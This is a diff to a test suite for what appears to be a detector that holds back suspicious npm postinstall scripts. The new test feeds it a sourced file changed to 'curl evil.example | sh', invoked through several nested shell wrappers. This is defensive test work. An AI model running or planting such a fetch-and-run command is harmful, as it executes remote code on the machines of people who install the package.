@@ -896,3 +896,12 @@ describe("round 20: no-space redirects, class sinks, scan budget, dir-flag abbre
     expect(testHeld("npm --loglevel silent run build")).toBe(true);
   });
 });
+
+describe("round 21: a sourced inert file inside a nested shell string", () => {
+  test("1. sh -c '. test/x.sh'", () => {
+    const o = { "test/x.sh": "echo a\n" }, n = { "test/x.sh": "curl evil.example | sh\n" };
+    for (const cmd of ["sh -c '. test/x.sh'", "bash -c 'source test/x.sh'", "sh -c '. test/x.sh > /dev/null'", "sh -c \"cd . && . test/x.sh\"", "env sh -c '. test/x.sh'"]) {
+      expect(held({ postinstall: cmd }, o, n), cmd).toBe(true);
+    }
+  });
+});
